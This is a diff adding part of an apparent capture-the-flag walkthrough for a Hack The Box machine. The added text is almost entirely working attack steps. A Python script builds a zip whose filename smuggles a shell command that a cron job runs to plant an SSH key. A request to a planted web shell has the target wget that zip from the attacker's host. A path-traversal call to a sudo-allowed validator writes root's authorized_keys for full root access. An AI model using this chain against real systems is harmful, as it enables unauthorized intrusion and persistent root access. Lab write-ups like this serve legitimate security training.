@@ -219,21 +219,103 @@ nc -lnvp 2222
 <img width="757" height="180" alt="image" src="https://github.com/user-attachments/assets/55dd8eae-8ee2-4aa7-bdda-10bfd8552e68" />
 
 
+## letral 
+
+```
+ssh-keygen -t ed25519 -f steve_key -N "" -C "steve@pwn"
+```
+
+
+```
+import zipfile
+
+pub = open("steve_key.pub","r").read().strip()
+
+# Payload in filename - executed by FontForge cron job
+payload = f'x$(mkdir -p /home/steve/.ssh && echo "{pub}" >> /home/steve/.ssh/authorized_keys && chmod 700 /home/steve/.ssh && chmod 600 /home/steve/.ssh/authorized_keys).ttf'
+
+with zipfile.ZipFile("evil.zip","w") as z:
+    z.writestr(payload, b"\x00"*100)
+
+print("[+] evil.zip created")
+print(f"Payload filename: {payload[:60]}...")
+```
+
+
+<img width="758" height="200" alt="image" src="https://github.com/user-attachments/assets/c30b2cef-5c82-4669-a4db-b020b05a8b70" />
+
+## move it to server and wait for cornjob
+
+```
+curl -s "http://portal.variatype.htb/files/shell.php?cmd=wget%20http://10.10.16.113:8888/evil.zip%20-O%20/var/www/portal.variatype.htb/public/files/evil.zip"
+
+```
+
+
+## read user.txt
+
+```
+ssh -o StrictHostKeyChecking=no -i steve_key steve@10.129.244.202 "id && whoami && cat ~/user.txt"
+```
+
+
+<img width="1003" height="177" alt="image" src="https://github.com/user-attachments/assets/b609cbf8-1bfc-49db-9872-e67d37df98c1" />
+
+
+```
+ssh -o StrictHostKeyChecking=no -i steve_key steve@10.129.244.202 "sudo -l"
+```
+
+<img width="1084" height="217" alt="image" src="https://github.com/user-attachments/assets/f688e34b-d260-4379-af29-29a884cff580" />
+
+## Generate root SSH key:
+
+```
+ssh-keygen -t ed25519 -f root_key -N "" -C "root@pwn"
+```
+
+## create root.py
+
+```py
+
+from http.server import HTTPServer, BaseHTTPRequestHandler
+
+data = open("root_key.pub","rb").read()
+
+class H(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header("Content-Length", str(len(data)))
+        self.end_headers()
+        self.wfile.write(data)
+    def log_message(self, format, *args):
+        pass
+
+HTTPServer(("0.0.0.0", 8889), H).serve_forever()
+```
+
+
+## run it in bg **`python3 root.py&`**
+
+
+---
+
+```
+ssh -o StrictHostKeyChecking=no -i steve_key steve@10.129.244.202 \
+  "sudo /usr/bin/python3 /opt/font-tools/install_validator.py 'http://10.10.16.113:8889/%2Froot%2F.ssh%2Fauthorized_keys'"
+
+```
+
+<img width="1245" height="148" alt="image" src="https://github.com/user-attachments/assets/c3656978-9665-4c7d-b9b4-f74f767485ab" />
 
 
 
+```
+ssh -o StrictHostKeyChecking=no -i root_key root@10.129.244.202 "whoami && cat /root/root.txt"
+```
 
 
-
-
-
-
-
-
-
-
-
-
+<img width="1002" height="179" alt="image" src="https://github.com/user-attachments/assets/d616aa58-7e5b-45c2-a90b-1951ef273e38" />
 
 
 
